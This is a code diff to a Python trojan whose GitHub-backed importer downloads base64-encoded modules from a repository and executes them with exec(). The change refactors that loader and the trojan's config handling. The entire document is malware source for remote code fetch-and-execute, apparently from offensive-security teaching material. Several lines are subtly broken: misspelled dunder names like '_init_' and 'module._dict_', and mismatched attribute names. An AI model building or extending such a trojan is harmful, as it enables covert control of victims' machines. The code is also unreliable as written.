@@ -29,7 +29,7 @@ class Trojan:
         config = json.loads(base64.b64decode(config_json))
         for task in config:
             if task['module'] not in sys.modules:
-                exec("import %s" % task['module'])
+                importlib.import_module(task['module'])
         return config
 
     def module_runner(self, module):
@@ -53,14 +53,14 @@ class Trojan:
 
 class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
     def _init_(self):
-        self.current_module_code = b""
+        self._module_codes = {}
 
     def find_spec(self, name, path, target=None):
         print(f"[*] Attempting to retrieve {name}")
         repo = github_connect()
         new_library = get_file_contents('modules', f'{name}.py', repo)
         if new_library is not None:
-            self.current_module_code = base64.b64decode(new_library)
+            self._module_codes[name] = base64.b64decode(new_library)
             return importlib.util.spec_from_loader(name, loader=self)
         return None
 
@@ -68,7 +68,9 @@ class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
         return None
 
     def exec_module(self, module):
-        exec(self.current_module_code, module._dict_)
+        code = self.module_codes.get(module.name_, b"")
+        exec(compile(code, f'<github:{module._name}>', 'exec'), module.dict_)
+
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
     trojan = Trojan('abc')
